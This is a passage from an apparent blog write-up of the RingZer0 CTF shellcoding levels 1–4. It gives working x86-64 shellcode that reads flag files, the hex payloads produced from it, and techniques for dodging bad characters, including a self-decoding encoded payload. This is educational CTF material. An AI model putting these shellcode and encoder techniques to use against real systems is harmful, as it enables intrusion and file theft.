<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>_start:
</span><span class='line'>
</span><span class='line'>mov dword [rsp], '/fla'     ; build filename on stack
</span><span class='line'>mov dword [rsp+4], 'g/le'
</span><span class='line'>mov dword [rsp+8], 'vel1'
</span><span class='line'>mov dword [rsp+12], '.fla'
</span><span class='line'>push 'g'
</span><span class='line'>pop rcx
</span><span class='line'>mov [rsp+16], ecx
</span><span class='line'>
</span><span class='line'>lea rdi, [rsp]              ; rdi now points to filename '/flag/level1.flag'
</span><span class='line'>xor rsi, rsi                ; rsi contains O_RDONLY, the mode with which we'll open the file
</span><span class='line'>xor rax, rax
</span><span class='line'>inc rax
</span><span class='line'>inc rax                     ; syscall open = 2
</span><span class='line'>syscall 
</span><span class='line'>
</span><span class='line'>mov rbx, rax                ; filehandle of opened file
</span><span class='line'>
</span><span class='line'>lea rsi, [rsp]              ; rsi is the buffer to which we'll read the file
</span><span class='line'>mov rdi, rbx                ; rbx was the filehandle
</span><span class='line'>push byte 0x7f              ; read 127 bytes. if we stay below this value, the generated opcode will not contain null bytes
</span><span class='line'>pop rdx
</span><span class='line'>xor rax, rax                ; syscall read = 0
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>lea rsi, [rsp]              ; the contents of the file were on the stack
</span><span class='line'>xor rdi, rdi
</span><span class='line'>inc rdi                     ; filehandle; stdout!
</span><span class='line'>mov rdx, rax                ; rax was amount of bytes read by syscall read
</span><span class='line'>xor rax, rax
</span><span class='line'>inc rax
</span><span class='line'>syscall                     ; syscall write = 1
</span><span class='line'>
</span><span class='line'>push byte 60                ; some bytes left...
</span><span class='line'>pop rax                     ; exit cleanly
</span><span class='line'>syscall
</span></code></pre></td></tr></table></div></figure>


<p>To assemble and generate the shellcode in the format which the challenge wants, I used this command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span><span class="p">;</span> nasm -f bin ./level1-nonulls.asm<span class="p">;</span> xxd -c <span class="m">1</span> ./level1-nonulls <span class="p">|</span> awk <span class="s1">&#39;{print &quot;\\x&quot;$2 }&#39;</span> <span class="p">|</span>tr -d <span class="s1">&#39;\n&#39;</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> wc -c ./level1-nonulls
</span><span class='line'>
</span><span class='line'><span class="se">\x</span>c7<span class="se">\x</span>04<span class="se">\x</span>24<span class="se">\x</span>2f<span class="se">\x</span>66<span class="se">\x</span>6c<span class="se">\x</span>61<span class="se">\x</span>c7<span class="se">\x</span>44<span class="se">\x</span>24<span class="se">\x</span>04<span class="se">\x</span>67<span class="se">\x</span>2f<span class="se">\x</span>6c<span class="se">\x</span>65<span class="se">\x</span>c7<span class="se">\x</span>44<span class="se">\x</span>24<span class="se">\x</span>08<span class="se">\x</span>76<span class="se">\x</span>65<span class="se">\x</span>6c<span class="se">\x</span>31<span class="se">\x</span>c7<span class="se">\x</span>44<span class="se">\x</span>24<span class="se">\x</span>0c<span class="se">\x</span>2e<span class="se">\x</span>66<span class="se">\x</span>6c<span class="se">\x</span>61<span class="se">\x</span>6a<span class="se">\x</span>67<span class="se">\x</span>59<span class="se">\x</span>89<span class="se">\x</span>4c<span class="se">\x</span>24<span class="se">\x</span>10<span class="se">\x</span>48<span class="se">\x</span>8d<span class="se">\x</span>3c<span class="se">\x</span>24<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>f6<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>c3<span class="se">\x</span>48<span class="se">\x</span>8d<span class="se">\x</span>34<span class="se">\x</span>24<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>df<span class="se">\x</span>6a<span class="se">\x</span>7f<span class="se">\x</span>5a<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>8d<span class="se">\x</span>34<span class="se">\x</span>24<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>ff<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c7<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>c2<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>6a<span class="se">\x</span>3c<span class="se">\x</span>58<span class="se">\x</span>0f<span class="se">\x</span>05
</span><span class='line'><span class="m">100</span> ./level1-nonulls
</span></code></pre></td></tr></table></div></figure>


<p>It spits out the shellcode, ready for copy &amp; paste, along with the size of the shellcode. Running it versus the server yields the flag!</p>

<h2>Level 2</h2>

<p>The password for level 2 is the flag of level 1. It seems the ante has been upped:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>RingZer0 Team CTF Shellcoding Level 2
</span><span class='line'>Submit your shellcode using hex representation <span class="s2">&quot;\xcc\xcd&quot;</span>.
</span><span class='line'>Type <span class="s2">&quot;end&quot;</span> to exit.
</span><span class='line'>
</span><span class='line'>This level have shellcode restriction. Bad char list <span class="s2">&quot;\x0a\x0d\x2f\x2e\x62\x99&quot;</span> max size <span class="m">50</span> bytes.
</span><span class='line'>You main goal is to <span class="nb">read</span> /flag/level2.flag
</span></code></pre></td></tr></table></div></figure>


<p>So the previous shellcode goes right out the window. I needed to cut it in half, length-wise. Also, not all characters are allowed, so-called <em>bad chars</em>. This will restrict the instructions we can use in the shellcode. Let&rsquo;s have a look at how we can trim the fat off of the shellcode of level 1.</p>

<p>First, hard-coding the filename is out of the question. That would waste at least 18 bytes, or 36% of the shellcode. Furthermore, it would contain the bad char <code>0x2f</code> which is the slash <code>/</code>. Instead, I decided to read in the name of the file with a syscall; the rest of the shellcode then takes care of opening that file, reading from it and sending the bytes back to us.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>_start:
</span><span class='line'>xor rax, rax        <span class="p">;</span> syscall <span class="nb">read</span> <span class="o">=</span> 0
</span><span class='line'>xor rdi, rdi        <span class="p">;</span> we<span class="s1">&#39;ll read from stdin</span>
</span><span class='line'><span class="s1">mov rsi, rsp        ; one byte shorter than &#39;</span>lea rsi, <span class="o">[</span>rsi<span class="o">]</span><span class="err">&#39;</span>
</span><span class='line'>push byte <span class="m">18</span>        <span class="p">;</span> number of bytes to <span class="nb">read</span>, enough <span class="k">for</span> the filename
</span><span class='line'>pop rdx
</span><span class='line'>syscall   
</span><span class='line'>
</span><span class='line'>xor rax, rax
</span><span class='line'>inc rax
</span><span class='line'>inc rax             <span class="p">;</span> syscall open
</span><span class='line'>                    <span class="p">;</span> instead of setting rdi to the filename <span class="o">(</span>located on the stack<span class="o">)</span>,
</span><span class='line'>                    <span class="p">;</span> we re-use the fact that rdi is zero and rsi points to that filename
</span><span class='line'>xchg rsi, rdi       <span class="p">;</span> now <span class="nv">rsi</span> <span class="o">=</span> <span class="m">0</span> <span class="o">(</span>O_RDONLY<span class="o">)</span>, and rdi points to the filename we just <span class="nb">read</span>
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>xchg rax, rsi       <span class="p">;</span> after this, rsi contains the filehandle of the opened file, rax contains 0
</span><span class='line'>xchg rdi, rsi       <span class="p">;</span> after this, rdi contains the filehandle and rsi points to the stack <span class="o">(</span>a buffer!<span class="o">)</span>
</span><span class='line'>push byte 127
</span><span class='line'>pop rdx             <span class="p">;</span> <span class="nb">read </span><span class="m">127</span> bytes, should be plenty
</span><span class='line'>syscall             <span class="p">;</span> because we <span class="nb">set </span>rax to 0, this will call syscall <span class="nb">read</span>
</span><span class='line'>
</span><span class='line'>xor rax, rax
</span><span class='line'>inc rax             <span class="p">;</span> syscall write
</span><span class='line'>mov rdi, rax        <span class="p">;</span> copy the value of rax to rdi <span class="o">(</span><span class="nv">1</span> <span class="o">=</span> stdout<span class="o">)</span>
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> still pointer to buffer
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rdx</span> <span class="o">=</span> still 0x7f
</span><span class='line'>syscall             <span class="p">;</span> grab the flag!
</span></code></pre></td></tr></table></div></figure>


<p>Assembling the shellcode is done with the previous command. No bad chars made it into the shellcode, and we have one byte to spare!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span><span class="p">;</span> nasm -f bin ./level2-shellcode.asm<span class="p">;</span> xxd -c <span class="m">1</span> ./level2-shellcode <span class="p">|</span> awk <span class="s1">&#39;{print &quot;\\x&quot;$2 }&#39;</span> <span class="p">|</span>tr -d <span class="s1">&#39;\n&#39;</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> wc -c ./level2-shellcode
</span><span class='line'>
</span><span class='line'><span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>ff<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>e6<span class="se">\x</span>6a<span class="se">\x</span>12<span class="se">\x</span>5a<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>87<span class="se">\x</span>f7<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>96<span class="se">\x</span>48<span class="se">\x</span>87<span class="se">\x</span>fe<span class="se">\x</span>6a<span class="se">\x</span>7f<span class="se">\x</span>5a<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>c7<span class="se">\x</span>0f<span class="se">\x</span>05
</span><span class='line'><span class="m">49</span> ./level2-shellcode
</span></code></pre></td></tr></table></div></figure>


<p>Running it on the server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>shellcode&gt;<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>ff<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>e6<span class="se">\x</span>6a<span class="se">\x</span>12<span class="se">\x</span>5a<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>87<span class="se">\x</span>f7<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>96<span class="se">\x</span>48<span class="se">\x</span>87<span class="se">\x</span>fe<span class="se">\x</span>6a<span class="se">\x</span>7f<span class="se">\x</span>5a<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>ff<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>c7<span class="se">\x</span>0f<span class="se">\x</span>05
</span><span class='line'>  Shellcode received...
</span><span class='line'>  Shellcode length <span class="o">(</span>49<span class="o">)</span> bytes.
</span><span class='line'>
</span><span class='line'>  Success: Executing shellcode...
</span><span class='line'>
</span><span class='line'>/flag/level2.flag^@
</span><span class='line'>FLAG-&lt;redacted&gt;
</span><span class='line'>  Error: SIGSEGV received I think your shellcode is not working
</span></code></pre></td></tr></table></div></figure>


<p>After succesfully executing the shellcode, it demands input on stdin. Specifically, it needs the filename which we want to read. Notice that the filename is terminated with a NULL byte: this can be done by typing in the correct filename and then pressing <code>Ctrl+Space</code> to send a NULL byte. When done, pressing enter will yield the flag!</p>

<h2>Level 3</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>This level have shellcode restriction. Bad char list <span class="s2">&quot;\x0a\x0d\x2f\x2e\x62\x48\x98\x99\x30\x31&quot;</span> max size <span class="m">50</span> bytes.
</span><span class='line'>You main goal is to <span class="nb">read</span> /flag/level3.flag
</span></code></pre></td></tr></table></div></figure>


<p>Again, fifty bytes maximum shellcode length, but more bad chars have been added. Unfortunately, the bad chars <code>0x48</code> and <code>0x31</code> make the use of <code>xor rax, rax</code> and the like impossible! Instead, to zero a register, something like this can be done:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>push byte <span class="m">1</span>     <span class="p">;</span> 0x6a, 0x01
</span><span class='line'>pop rbx         <span class="p">;</span> 0x5b
</span><span class='line'>dec bl          <span class="p">;</span> 0xff
</span></code></pre></td></tr></table></div></figure>


<p>This effectively clears <code>rbx</code>. This register also typically keeps it&rsquo;s original value after a syscall (it&rsquo;s non-volatile), so it&rsquo;s a good place to store something we&rsquo;ll use more often.</p>

<p>Furthermore, I like to use <code>xchg</code> to swap around contents of registers. However, if this is done on full 64-bit registers, the assembler generates a <code>0x48</code> byte, which is a bad char. Instead, the values can be passed around via the stack:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;</span> instruction   <span class="p">;</span> opcode
</span><span class='line'><span class="p">;</span> --------------<span class="p">|</span>-------
</span><span class='line'>push rax        <span class="p">;</span> 0x50
</span><span class='line'>push rbx        <span class="p">;</span> 0x53
</span><span class='line'>pop rax         <span class="p">;</span> 0x58
</span><span class='line'>pop rbx         <span class="p">;</span> 0x5b
</span></code></pre></td></tr></table></div></figure>


<p>The effect of this is that <code>rax</code> now contains the value of <code>rbx</code> and vice-versa. Without further ado, the shellcode for level 3:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>_start:
</span><span class='line'>
</span><span class='line'>push byte 1
</span><span class='line'>pop rbx
</span><span class='line'>dec bl              <span class="p">;</span> rbx is now zeroed out, avoiding the bad chars 0x31 and 0x48.
</span><span class='line'>
</span><span class='line'>push rbx
</span><span class='line'>pop rax             <span class="p">;</span> rax is now zeroed out too.
</span><span class='line'>
</span><span class='line'>push rbx
</span><span class='line'>pop rdi             <span class="p">;</span> stdin is zero, so zero out rdi as well
</span><span class='line'>
</span><span class='line'>push rsp            <span class="p">;</span> make rsi point to the top of the stack
</span><span class='line'>pop rsi             <span class="p">;</span> the buffer <span class="k">for</span> syscall <span class="nb">read</span>
</span><span class='line'>
</span><span class='line'>push byte <span class="m">18</span>        <span class="p">;</span> <span class="nb">read </span>in <span class="m">18</span> bytes
</span><span class='line'>pop rdx
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>push rbx
</span><span class='line'>pop rax
</span><span class='line'>inc al
</span><span class='line'>inc al              <span class="p">;</span> syscall open
</span><span class='line'>
</span><span class='line'><span class="p">;</span>xchg rsi, rdi      <span class="p">;</span> we cannot use this xchg opcode because of 0x48!
</span><span class='line'>push rdi            <span class="p">;</span> instead, <span class="k">do</span> the exchange of rsi and rdi via the stack
</span><span class='line'>push rsi
</span><span class='line'>pop rdi             <span class="p">;</span> rdi is now pointing to the filename on the stack
</span><span class='line'>pop rsi             <span class="p">;</span> rsi is now zero <span class="o">(</span>flag O_RDONLY<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>syscall
</span><span class='line'>                    <span class="p">;</span> pull a similar trick here, swapping around three registers
</span><span class='line'>push rax            <span class="p">;</span> fd of just opened file
</span><span class='line'>push rsi            <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> 0
</span><span class='line'>push rdi            <span class="p">;</span> <span class="nv">rdi</span> <span class="o">=</span> pointer to top of stack
</span><span class='line'>pop rsi             <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> buf
</span><span class='line'>pop rax             <span class="p">;</span> <span class="nv">rax</span> <span class="o">=</span> <span class="m">0</span> syscall <span class="nb">read</span>
</span><span class='line'>pop rdi             <span class="p">;</span> <span class="nv">rdi</span> <span class="o">=</span> fd
</span><span class='line'>
</span><span class='line'>push byte 127
</span><span class='line'>pop rdx             <span class="p">;</span> amount of bytes to <span class="nb">read</span>
</span><span class='line'>syscall             <span class="p">;</span> syscall <span class="nb">read</span>
</span><span class='line'>
</span><span class='line'>push rbx
</span><span class='line'>pop rax
</span><span class='line'>inc al              <span class="p">;</span> syscall write
</span><span class='line'>push rax            <span class="p">;</span> copy rax <span class="o">(==</span>1<span class="o">)</span> to rdi
</span><span class='line'>pop rdi             <span class="p">;</span> <span class="nv">1</span> <span class="o">=</span> stdout
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rsi</span> <span class="o">=</span> still pointing to buffer with contents of file
</span><span class='line'>                    <span class="p">;</span> <span class="nv">rdx</span> <span class="o">=</span> still 0x7f
</span><span class='line'>syscall
</span></code></pre></td></tr></table></div></figure>


<p>Assembling it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span><span class="p">;</span> nasm -f bin ./shellcode3.asm<span class="p">;</span> xxd -c <span class="m">1</span> ./shellcode3 <span class="p">|</span> awk <span class="s1">&#39;{print &quot;\\x&quot;$2 }&#39;</span> <span class="p">|</span>tr -d <span class="s1">&#39;\n&#39;</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> wc -c ./shellcode3
</span><span class='line'>
</span><span class='line'><span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>5b<span class="se">\x</span>fe<span class="se">\x</span>cb<span class="se">\x</span>53<span class="se">\x</span>58<span class="se">\x</span>53<span class="se">\x</span>5f<span class="se">\x</span>54<span class="se">\x</span>5e<span class="se">\x</span>6a<span class="se">\x</span>12<span class="se">\x</span>5a<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>53<span class="se">\x</span>58<span class="se">\x</span>fe<span class="se">\x</span>c0<span class="se">\x</span>fe<span class="se">\x</span>c0<span class="se">\x</span>57<span class="se">\x</span>56<span class="se">\x</span>5f<span class="se">\x</span>5e<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>50<span class="se">\x</span>56<span class="se">\x</span>57<span class="se">\x</span>5e<span class="se">\x</span>58<span class="se">\x</span>5f<span class="se">\x</span>6a<span class="se">\x</span>7f<span class="se">\x</span>5a<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>53<span class="se">\x</span>58<span class="se">\x</span>fe<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>5f<span class="se">\x</span>0f<span class="se">\x</span>05
</span><span class='line'><span class="m">47</span> ./shellcode3
</span></code></pre></td></tr></table></div></figure>


<p>Haha! No bad chars <em>and</em> three bytes to spare!</p>

<h2>Level 4</h2>

<p>I wasn&rsquo;t laughing anymore once I saw the restrictions placed on the shellcode of level 4:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>This level have shellcode restriction. Bad char list <span class="s2">&quot;\x0a\x0d\x2f\xff\x0f\x05\x48&quot;</span> max size <span class="m">80</span> bytes.
</span></code></pre></td></tr></table></div></figure>


<p>This bans the use of <code>syscall</code>, which assembles to <code>0x0f, 0x05</code>. In theory, I think <code>int 0x80</code> (<code>cd 80</code>) could be used, but I haven&rsquo;t verified. The shellcode needs to be obfuscated and decoded at runtime somehow. I decided to make a very simple encoding &amp; decoding system: the bytes are simply increased by one. At runtime, a small stub of code is responsible for decrementing each byte to it&rsquo;s proper value.</p>

<p>I&rsquo;ve made use of a cool trick available on the 64-bit architecture: RIP-relative addressing. Normally, to get the address at which something is running, we&rsquo;d do this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jmp _over_the_shellcode         <span class="p">;</span> jmp short, assembles to 0xeb + <span class="m">8</span> bit signed displacement
</span><span class='line'>
</span><span class='line'>_getInstructionPointer:
</span><span class='line'>pop rbx                         <span class="p">;</span> rbx now contains the address of _location
</span><span class='line'>
</span><span class='line'><span class="p">;</span> ...shellcode bytes...
</span><span class='line'>
</span><span class='line'>_over_the_shellcode:
</span><span class='line'>call _getInstructionPointer     <span class="p">;</span> call backward, assembles to 0xe8 and a <span class="m">32</span> bit signed displacement
</span><span class='line'>
</span><span class='line'>_location:
</span></code></pre></td></tr></table></div></figure>


<p>However, this <code>jmp/call/pop</code> sequence to get the current location of code would introduce <code>0xff</code> bytes due to the relative call backwards. We can&rsquo;t use this, but luckily RIP-relative addressing comes to the rescue!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>lea rax, <span class="o">[</span>rel _shellcode<span class="o">]</span>    <span class="p">;</span> notice the use of the rel keyword!
</span><span class='line'>
</span><span class='line'>_shellcode:
</span></code></pre></td></tr></table></div></figure>


<p>Again, however, due to the nature of this instruction (it uses a 32-bit displacement value) this would introduce NULL bytes. Instead, I decided to offset the value with a constant and then subtracting that constant. Finally, I needed to select a proper register. I settled on <code>r14</code>, because <code>rax</code> through <code>rdi</code> would introduce bad chars, and so would <code>r15</code>.</p>

<p>The decoder looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>default rel                         <span class="p">;</span> we<span class="s1">&#39;ll use relative addressing to get RIP</span>
</span><span class='line'>
</span><span class='line'><span class="s1">_start:</span>
</span><span class='line'><span class="s1">                                    ; we use r14, because this will avoid the 0x48 byte</span>
</span><span class='line'><span class="s1">                                    ; lea eax/ecx etc emits 0x48</span>
</span><span class='line'><span class="s1">lea r14, [rel _shellcode+0x12345678]; we can&#39;</span>t use it directly, because of null bytes.
</span><span class='line'>sub r14, 0x12345678                 <span class="p">;</span> restore the value in r14, so it points to the encoded shellcode.
</span><span class='line'>
</span><span class='line'>push byte <span class="m">43</span>                        <span class="p">;</span> put amount of bytes to decode
</span><span class='line'>pop rcx                             <span class="p">;</span> in rcx
</span><span class='line'>
</span><span class='line'>_decode:
</span><span class='line'>dec byte <span class="o">[</span>r14<span class="o">]</span>                      <span class="p">;</span> start at r14 <span class="o">(</span>_fakecall<span class="o">)</span>
</span><span class='line'>add r14, <span class="m">1</span>                          <span class="p">;</span> <span class="s1">&#39;decode&#39;</span> by adding 1
</span><span class='line'>loop _decode                        <span class="p">;</span> decode <span class="sb">`</span>ecx<span class="sb">`</span> bytes.
</span><span class='line'>
</span><span class='line'>_shellcode:                         <span class="p">;</span> place <span class="s1">&#39;encoded&#39;</span> shellcode here
</span></code></pre></td></tr></table></div></figure>


<p>The actual shellcode is nearly the same one used above. It reads in the name of the file you want to read (terminate with <code>^@</code> or <code>0x00</code> by typing Ctrl+space). It then opens that file, reads from it, storing the data on the stack. It finally writes the contents of the file back to us.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
